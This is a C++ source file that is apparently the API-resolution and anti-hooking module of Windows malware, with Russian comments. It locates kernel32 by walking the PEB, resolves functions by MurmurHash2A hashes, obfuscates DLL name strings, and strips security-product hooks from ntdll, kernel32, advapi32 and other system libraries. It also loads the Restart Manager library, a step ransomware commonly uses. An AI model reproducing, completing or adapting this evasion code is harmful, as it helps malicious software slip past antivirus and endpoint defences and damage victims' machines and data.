#include "api.h"
#include "antihook/antihooks.h"
#include "hash.h"

#define HASHING_SEED 23341
#define API_CACHE_SIZE (sizeof(LPVOID) * 1024)

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE
{
	LIST_ENTRY e[3];
	HMODULE base;
	void* entry;
	UINT size;
	UNICODE_STRING dllPath;
	UNICODE_STRING dllname;
};

typedef HMODULE (WINAPI *fnLoadLibraryA)(
	_In_ LPCSTR lpLibFileName
);

STATIC HMODULE g_hKernel32;
STATIC fnLoadLibraryA pLoadLibraryA;
STATIC LPVOID* g_ApiCache = NULL;
STATIC BOOL g_IsRestartManagerLoaded = FALSE;

#ifdef _WIN64
#  define ADDR DWORDLONG
#else
#define   ADDR DWORD
#endif

#define RVATOVA( base, offset ) ( (ADDR)base + (ADDR)offset )

HMODULE hKernel32;
HMODULE hWs2_32;
HMODULE hAdvapi32;
HMODULE hNtdll;
HMODULE hRstrtmgr;
HMODULE hOle32;
HMODULE hOleAut;
HMODULE hNetApi32;
HMODULE hIphlp32;
HMODULE hShell32;
HMODULE hShlwapi;


VOID 
api::DisableHooks()
{
	hKernel32 = pLoadLibraryA(OBFA("kernel32.dll"));
	hWs2_32 = pLoadLibraryA(OBFA("ws2_32.dll"));
	hAdvapi32 = pLoadLibraryA(OBFA("Advapi32.dll"));
	hNtdll = pLoadLibraryA(OBFA("ntdll.dll"));
	hRstrtmgr = pLoadLibraryA(OBFA("Rstrtmgr.dll"));
	hOle32 = pLoadLibraryA(OBFA("Ole32.dll"));
	hOleAut = pLoadLibraryA(OBFA("OleAut32.dll"));
	hNetApi32 = pLoadLibraryA(OBFA("Netapi32.dll"));
	hIphlp32 = pLoadLibraryA(OBFA("Iphlpapi.dll"));
	hShlwapi = pLoadLibraryA(OBFA("Shlwapi.dll"));
	hShell32 = pLoadLibraryA(OBFA("Shell32.dll"));

	if (hNtdll) {
		removeHooks(hNtdll);
	}

	if (hKernel32) {
		removeHooks(hKernel32);
	}

	if (hWs2_32) {
		removeHooks(hWs2_32);
	}

	if (hAdvapi32) {
		removeHooks(hAdvapi32);
	}

	if (hRstrtmgr) {

		g_IsRestartManagerLoaded = TRUE;
		removeHooks(hRstrtmgr);

	}

	if (hOle32) {
		removeHooks(hOle32);
	}

	if (hOleAut) {
		removeHooks(hOle32);
	}

	if (hNetApi32) {
		removeHooks(hNetApi32);
	}

	if (hIphlp32) {
		removeHooks(hIphlp32);
	}

	if (hShlwapi) {
		removeHooks(hShlwapi);
	}

	if (hShell32) {
		removeHooks(hShell32);
	}
}


BOOL
api::IsRestartManagerLoaded() {
	return g_IsRestartManagerLoaded;
}

STATIC
INT
StrLen(__in LPCSTR Str)
{
	INT Length = 0;
	while (*Str)
	{

		Length++;
		Str++;

	}

	return Length;
}

STATIC
INT
StrLen(__in LPCWSTR Str)
{
	INT Length = 0;
	while (*Str)
	{

		Length++;
		Str++;

	}

	return Length;
}

void* m_memset(void* szBuffer, DWORD dwSym, DWORD dwLen)
{
	if (!szBuffer)
	{
		return NULL;
	}

	__asm
	{
		pushad
		mov		edi, [szBuffer]
		mov		ecx, [dwLen]
		mov		eax, [dwSym]
		rep		stosb
		popad
	}

	return NULL;
}

void* m_memcpy(void* szBuf, const void* szStr, int nLen)
{
	if (!szBuf || !szStr)
	{
		return NULL;
	}

	__asm
	{
		pushad
		mov		esi, [szStr]
		mov		edi, [szBuf]
		mov		ecx, [nLen]
		rep		movsb
		popad
	}

	return NULL;
}

LPSTR FindChar(LPSTR Str, CHAR Ch)
{
	while (*Str)
	{

		if (*Str == Ch) {
			return Str;
		}

		Str++;

	}

	return NULL;
}

int my_stoi(char* str) {
	unsigned int strLen = 0;
	unsigned int i = 0;
	while (str[i] != '\0') {
		strLen += 1;
		i++;
	}

	int num = 0;
	int ten;
	BOOL signFlag = TRUE; //true: +, false: -
	for (i = 0; i < strLen; i++) {
		if (str[i] < '0' || str[i] > '9') {
			if (i == 0 && str[i] == '-') {
				signFlag = FALSE;
				continue;
			}
			if (i == 0 && str[i] == '+') {
				signFlag = TRUE;
				continue;
			}

			return 0;
		}

		ten = 1;
		for (unsigned int j = 0; j < strLen - 1 - i; j++) {
			ten *= 10;
		}

		num += ten * (str[i] - '0');
	}

	if (signFlag) {
		return num;
	}
	else {
		return -num;
	}
}

/*
LPVOID GetProcAddressByHash(HMODULE module, DWORD api_hash, BOOL isByOrd)
{
	PIMAGE_DOS_HEADER img_dos_header;
	PIMAGE_NT_HEADERS img_nt_header;
	PIMAGE_EXPORT_DIRECTORY in_export;

	img_dos_header = (PIMAGE_DOS_HEADER)module;
	img_nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)img_dos_header + img_dos_header->e_lfanew);
	in_export = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)img_dos_header +
		img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD_PTR in_export_end = (DWORD_PTR)in_export +
		img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	PDWORD rva_name;
	PWORD rva_ordinal;

	rva_name = (PDWORD)((DWORD_PTR)img_dos_header + in_export->AddressOfNames);
	rva_ordinal = (PWORD)((DWORD_PTR)img_dos_header + in_export->AddressOfNameOrdinals);

	UINT ord = -1;
	char* api_name;
	unsigned int i;

	if (isByOrd) {
		ord = api_hash;
	}
	else {
		for (i = 0; i < in_export->NumberOfNames - 1; i++) {
			api_name = (PCHAR)((DWORD_PTR)img_dos_header + rva_name[i]);
			int len = StrLen(api_name);

			DWORD hash = MurmurHash2A(api_name, len, HASHING_SEED);

			if (api_hash == hash) {
				ord = static_cast<UINT>(rva_ordinal[i]);
				break;
			}
		}
		if (ord == -1) {
			//error, not found
			return NULL;
		}
	}
	const auto func_addr = (PDWORD)((DWORD_PTR)img_dos_header + in_export->AddressOfFunctions);
	const auto func_find = (LPVOID)((DWORD_PTR)img_dos_header + func_addr[ord]);

	if ((DWORD_PTR)func_find >= (DWORD_PTR)in_export && (DWORD_PTR)func_find < in_export_end) {
		// адрес находится в таблице экспорта
		// Forwarder
		CHAR    pszBuffer[MAX_PATH + 1];
		LPSTR   pszLibName = NULL;
		LPSTR   pszFuncName = NULL;
		WORD    uOrd = 0;

		m_memset(pszBuffer, 0, sizeof(pszBuffer));
		m_memcpy(pszBuffer, (LPSTR)(func_find), StrLen((LPSTR)func_find));

		pszFuncName = FindChar(pszBuffer, '.');
		if (!pszFuncName) {
			//forwarden format error
			return NULL;
		}
		*pszFuncName = '\0';
		pszFuncName++;

		if (*pszFuncName == '#') {
			pszFuncName++;
			uOrd = my_stoi(pszFuncName);
		}

		HMODULE hLib = pLoadLibraryA != NULL ? pLoadLibraryA(pszBuffer) : NULL;
		if (!hLib) {
			//error load library
			return NULL;
		}
		//Get named function
		if (!uOrd) {
			//Get named function
			return GetProcAddressByHash(hLib, MurmurHash2A(pszFuncName, StrLen(pszFuncName), HASHING_SEED), FALSE);
		}
		else {
			//Get by ord function
			return GetProcAddressByHash(hLib, uOrd, TRUE);
		}
	}

	return func_find;
}

*/
LPVOID GetForvardedProc(PCHAR Name)
{
	char szDll[] = { '.','c','k','m',0 };
	// Функция обработки переназначения экспорта
	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
	--szDll[3];
	szDll[1]++;
	++szDll[2];

	if (Name == NULL) return NULL;

	char DLLName[256];
	m_memset(DLLName, 0, sizeof(DLLName));

	PCHAR NameStr = FindChar(Name, '.');
	if (!NameStr) return NULL;


	/// Собираем имя библиотеки
	m_memcpy(DLLName, Name, NameStr - Name);

	strcat(DLLName, szDll);

	/// определяем имя функции
	++NameStr;
	if (*NameStr == '#')
	{
		// Имя является номером функции
		++NameStr;
		DWORD OrdNomber = my_stoi(NameStr);
		return api::GetProcAddressEx(DLLName, 0, OrdNomber);

	}
	DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED);
	return api::GetProcAddressEx(DLLName, 0, Hash);
}

BOOL CheckForForvardedProc(ADDR Addr, PIMAGE_EXPORT_DIRECTORY Table, DWORD DataSize)
{
	if (Addr > (ADDR)Table) {
		if ((Addr - (ADDR)Table < DataSize)) {
			return TRUE;
		}
	}
	return FALSE;
}


DWORD GetFunctionAddresss(HMODULE Module, PIMAGE_EXPORT_DIRECTORY Table, LONG Ordinal)
{
	PDWORD AddrTable = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
	DWORD RVA = AddrTable[Ordinal];
	ADDR Ret = (ADDR)RVATOVA(Module, RVA);
	return Ret;
}

VOID ReturnAddress(PDWORD pAddress, DWORD dwAddress)
{
	DWORD temp = dwAddress + 1;
	CopyMemory(&temp, &dwAddress, sizeof(DWORD));
	temp++;
	CopyMemory(pAddress, &temp, sizeof(DWORD));
}

VOID GetApiAddr(HMODULE Module, DWORD ProcNameHash, PDWORD Address)
{
		/*----------- Функция возвращает адрес функции по её названию -----------*/
		// Получаем адрес дополнительных PE заголовков
	PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER)((char*)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

// Получаем адрес таблицы экспорта
	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	INT Ordinal; // Номер необходимой нам функции
	BOOL Found = FALSE;

	if (HIWORD(ProcNameHash) == 0)
	{
	// Ищем функцию по её номеру
		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
	}
	else
	{
	// Ищем функцию по номеру
	PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table->AddressOfNames);
	PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

	unsigned int i;
	char* ProcName;

	for (i = 0; i < Table->NumberOfNames; ++i)
	{

		ProcName = (char*)RVATOVA(Module, *NamesTable);


		if (MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED) == ProcNameHash)
		{
			Ordinal = *OrdinalTable;
			Found = TRUE;
				break;
		}

			// Увеличиваем позицию в таблице
		++NamesTable;
		++OrdinalTable;

	}

	}


// не нашли номер
	if (!Found) {

		*Address = 0;
		return;

	}

	ADDR Ret = GetFunctionAddresss(Module, Table, Ordinal);

	if (CheckForForvardedProc(Ret, Table, DataSize)) {
		Ret = (ADDR)GetForvardedProc((PCHAR)Ret);
	}

	ReturnAddress(Address, Ret + 1);

}


LPVOID
api::GetProcAddressEx2(
	__in char* Dll,
	__in DWORD dwModule,
	__in  DWORD dwProcNameHash,
	__in int CacheIndex
)
{
	// Функция возвращает адрес функции используя кэш
	LPVOID Addr = NULL;


	// Пытаемся получить адрес из кэша
	//bool UseCache = ApiC != NULL && CacheIndex > 0 && CacheIndex <= ApiCacheSize;


	Addr = g_ApiCache[CacheIndex];

	if (!Addr)
	{
		// Функции нет в кэше. Получаем её адрес и добавляем в кэш
		Addr = GetProcAddressEx(Dll, dwModule, dwProcNameHash);
		g_ApiCache[CacheIndex] = Addr;
	}
	return Addr;
}

LPVOID
api::GetProcAddressEx(
	__in_opt LPCSTR ModuleName,
	__in_opt DWORD ModuleId,
	__in DWORD Hash
)
{
	HMODULE hModule = NULL;
	DWORD ProcAddress = NULL;

	LPCSTR Advapi32DLL = OBFA("Advapi32.dll");
	LPCSTR Kernel32DLL = OBFA("Kernel32.dll");
	LPCSTR Netapi32DLL = OBFA("Netapi32.dll");
	LPCSTR IphlpapiDLL = OBFA("Iphlpapi.dll");
	LPCSTR RstrtmgrDLL = OBFA("Rstrtmgr.dll");
	LPCSTR Ws2_32DLL = OBFA("ws2_32.dll");
	LPCSTR User32DLL = OBFA("User32.dll");
	LPCSTR ShlwapiDLL = OBFA("Shlwapi.dll");
	LPCSTR Shell32DLL = OBFA("Shell32.dll");
	LPCSTR Ole32DLL = OBFA("Ole32.dll");
	LPCSTR OleAut32DLL = OBFA("OleAut32.dll");
	//CHAR Advapi32Dll[] = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
	//CHAR Kernel32Dll[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
	//CHAR Netapi32Dll[] = { 'N', 'e', 't', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
	//CHAR IphlpapiDll[] = { 'I', 'p', 'h', 'l', 'p', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };
	//CHAR RstrtmgrDll[] = { 'R', 's', 't', 'r', 't', 'm', 'g', 'r', '.', 'd', 'l', 'l', 0 };
	//CHAR Ws2_32Dll[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
	//CHAR User32Dll[] = { 'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
	//CHAR ShlwapiDll[] = { 'S', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };

	if (ModuleName)
	{

		hModule = pLoadLibraryA(ModuleName);

		if (hModule) {

			GetApiAddr(hModule, Hash, &ProcAddress);
			ProcAddress -= 2;
			return (LPVOID)ProcAddress;

		}

		return (LPVOID)0;

	}
	else
	{

		switch (ModuleId)
		{

		case KERNEL32_MODULE_ID:
			ModuleName = Kernel32DLL;
			break;

		case ADVAPI32_MODULE_ID:
			ModuleName = Advapi32DLL;
			break;

		case NETAPI32_MODULE_ID:
			ModuleName = Netapi32DLL;
			break;

		case IPHLPAPI_MODULE_ID:
			ModuleName = IphlpapiDLL;
			break;

		case RSTRTMGR_MODULE_ID:
			ModuleName = RstrtmgrDLL;
			break;

		case USER32_MODULE_ID:
			ModuleName = User32DLL;
			break;

		case WS2_32_MODULE_ID:
			ModuleName = Ws2_32DLL;
			break;

		case SHLWAPI_MODULE_ID:
			ModuleName = ShlwapiDLL;
			break;

		case SHELL32_MODULE_ID:
			ModuleName = Shell32DLL;
			break;

		case OLE32_MODULE_ID:
			ModuleName = Ole32DLL;
			break;

		case OLEAUT32_MODULE_ID:
			ModuleName = OleAut32DLL;
			break;

		default:
			return (LPVOID)0;

		}

		hModule = pLoadLibraryA(ModuleName);

		if (hModule) {

			GetApiAddr(hModule, Hash, &ProcAddress);
			ProcAddress -= 2;
			return (LPVOID)ProcAddress;

		}

	}

	return (LPVOID)0;
}

STATIC
DWORD
GetHashBase(__in LDR_MODULE* mdll)
{
	char name[64];

	size_t i = 0;

	while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1)
	{
		name[i] = (char)mdll->dllname.Buffer[i];
		i++;
	}

	name[i] = 0;

	return MurmurHash2A(name, StrLen(name), HASHING_SEED);
}

STATIC
HMODULE
GetKernel32()
{
	HMODULE krnl32;
	PCWCHAR Kernel32Dll = OBFW(L"Kernel32.dll");

#ifdef _WIN64
	const auto ModuleList = 0x18;
	const auto ModuleListFlink = 0x18;
	const auto KernelBaseAddr = 0x10;
	const INT_PTR peb = __readgsqword(0x60);
#else
	int ModuleList = 0x0C;
	int ModuleListFlink = 0x10;
	int KernelBaseAddr = 0x10;
	INT_PTR peb = __readfsdword(0x30);
#endif

	// Теперь получим адрес kernel32.dll

	const auto mdllist = *(INT_PTR*)(peb + ModuleList);
	const auto mlink = *(INT_PTR*)(mdllist + ModuleListFlink);
	auto krnbase = *(INT_PTR*)(mlink + KernelBaseAddr);

	auto mdl = (LDR_MODULE*)mlink;
	do
	{
		mdl = (LDR_MODULE*)mdl->e[0].Flink;

		if (mdl->base != nullptr)
		{
			if (GetHashBase(mdl) == KERNEL32DLL_HASH) { // KERNEL32.DLL

				break;

			}
		}
	} while (mlink != (INT_PTR)mdl);

	krnl32 = static_cast<HMODULE>(mdl->base);
	return krnl32;
}

LPVOID WINAPI GetImageBase(LPVOID procAddr)
{
	LPBYTE addr = (procAddr) ? (LPBYTE)procAddr : (LPBYTE)&GetImageBase;
	addr = (LPBYTE)((size_t)addr & 0xFFFFFFFFFFFF0000); // Маска с расчётом на X86 и X64
	for (;;)
	{
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)addr;
		if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE)
		{
			if (dosHeader->e_lfanew < 0x1000)
			{
				PIMAGE_NT_HEADERS header = (PIMAGE_NT_HEADERS) & ((unsigned char*)addr)[dosHeader->e_lfanew];
				if (header->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}
		addr -= 0x1000;
	}
	return addr;
}

BOOL
api::InitializeApiModule()
{
	g_hKernel32 = GetKernel32();

	DWORD dwLoadLibraryA;
	GetApiAddr(g_hKernel32, LOADLIBRARYA_HASH, &dwLoadLibraryA);
	pLoadLibraryA = fnLoadLibraryA(dwLoadLibraryA - 2);
	if (!pLoadLibraryA) {
		return FALSE;
	}

	g_ApiCache = (LPVOID*)m_malloc(API_CACHE_SIZE);
	if (!g_ApiCache) {
		return FALSE;
	}

	return TRUE;
}
